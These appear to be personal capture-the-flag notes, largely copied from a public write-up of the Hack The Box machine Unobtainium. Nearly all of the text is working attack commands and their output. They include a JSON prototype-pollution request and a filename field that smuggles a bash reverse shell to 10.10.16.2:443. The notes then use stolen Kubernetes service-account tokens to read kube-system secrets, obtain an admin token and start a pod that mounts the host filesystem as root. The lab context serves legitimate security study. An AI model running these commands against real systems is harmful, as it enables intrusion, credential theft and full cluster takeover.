### Prototype Pollution Attack
* https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/
* https://codeburst.io/what-is-prototype-pollution-49482fc4b638

### Pull Source
The `postinst` file suggested this was an Electron application, which is a framework for building cross-platform desktop applications using JavaScript, HTML, and CSS. Tons of populate applications are built on Electron, like VSCode, Slack, Discord, Atom, Typora, and Mailspring.

```bash
asar extract opt/unobtainium/resources/app.asar app.asar/
```

### Writeups, foothold and enum
I mostly copied from below to make myself undertand better.

https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html#

##### Prototype Pollution Attack to get foothold
```bash
curl -X PUT http://unobtainium.htb:31337/ -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'

curl -X POST http://unobtainium.htb:31337/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "test"}'

curl -X POST http://unobtainium.htb:31337/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.16.2/443 0>&1\""}'

python -c 'import pty;pty.spawn("bash")'

root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg

reset

reset: unknown terminal type unknown
Terminal type? screen
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# 
```

##### Lateral movement to another pod
```bash
kubectl auth -h --token $(cat default-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

kubectl auth can-i --list --token $(cat default-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

kubectl get pods -n dev --token $(cat default-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt
NAME                                  READY   STATUS    RESTARTS       AGE
devnode-deployment-776dbcf7d6-sr6vj   1/1     Running   3 (114d ago)   114d
devnode-deployment-776dbcf7d6-7gjgf   1/1     Running   3 (114d ago)   114d
devnode-deployment-776dbcf7d6-g4659   1/1     Running   3 (114d ago)   114d


kubectl describe pod devnode-deployment-776dbcf7d6-sr6vj -n dev --token $(cat default-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

Name:             devnode-deployment-776dbcf7d6-sr6vj
Namespace:        dev
Priority:         0
Service Account:  default
Node:             unobtainium/10.129.136.226
Start Time:       Mon, 29 Aug 2022 21:32:21 +1200
Labels:           app=devnode
                  pod-template-hash=776dbcf7d6
Annotations:      <none>
Status:           Running
IP:               10.42.0.33
IPs:
  IP:           10.42.0.33
Controlled By:  ReplicaSet/devnode-deployment-776dbcf7d6
Containers:
  devnode:
    Container ID:   docker://d210cfcf02a8b3fd035fadb8cf88e3ccee93da9e52732efea0c6ea6a498880a0
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:e965afd6a7e1ef3093afdfa61a50d8337f73cd65800bdeb4501ddfbc598016f5
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Wed, 21 Dec 2022 18:22:32 +1300
    Last State:     Terminated

curl -X PUT http://10.42.0.33:3000/ -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'

curl -X POST http://10.42.0.33:3000/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.16.2/443 0>&1\""}'
```

### List namespaces
```bash
kubectl get namespaces --token $(cat default-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

NAME              STATUS   AGE
default           Active   114d
kube-system       Active   114d
kube-public       Active   114d
kube-node-lease   Active   114d
dev               Active   114d
```

### Check permission under kube-system
```bash
kubectl auth can-i --list -n kube-system --token $(cat dev-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

### List secrets resource via the kube-system permission
```bash
kubectl get secrets -n kube-system --token $(cat dev-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

c-admin-token-b47f7                                  kubernetes.io/service-account-token   3      114d
```

### Get the admin token
```bash
kubectl describe secret c-admin-token-b47f7 -n kube-system --token $(cat dev-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt
```

### Verify that it's full admin
```bash
kubectl auth can-i --list --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

### Root as Filesystem by creating a new pod
##### Find Image
As with previous docker attacks, the idea is to create a new container and map the host filesystem into the container, where I will be root. That is basically root access to the host filesystem. The YAML files described in the articles all involve pulling docker images from the internet. Because Unobtainium won’t have internet access, I’ll opt to work from an image that’s already on the host.

I can get the full YAML for a pod with `get pod [name] -n [namespace]`:

I’ll loop over all the pods and see what images they are running. There’s only two:

```bash
kubectl get pods --all-namespaces --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt | grep -v NAMESPACE | while read line; do ns=$(echo $line | awk '{print $1}'); name=$(echo $line | awk '{print $2}'); kubectl get pod $name -o yaml -n $ns --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt | grep '  - image: '; done | sort -u

  - image: localhost:5000/dev-alpine
  - image: localhost:5000/node_server
```

##### Malicious Pod with two alternative yamls
I choose alpine because it’s smaller, node_server works too.

I’ve added the host filesystem `/` as a mount point inside the container.

Pods (like Docker containers) run until their main command is done. I’ll just add a long sleep as the main command (`tail -f /dev/null` is another good one to hold priority).

```bash
kubectl apply -f root.yaml --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

kubectl exec baturu02 --stdin --tty -n kube-system --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt -- /bin/sh

/ # cat mnt/root/root.txt
```

```bash
kubectl apply -f root2.yaml --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt

kubectl --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt get pod baturu11 -n kube-system
```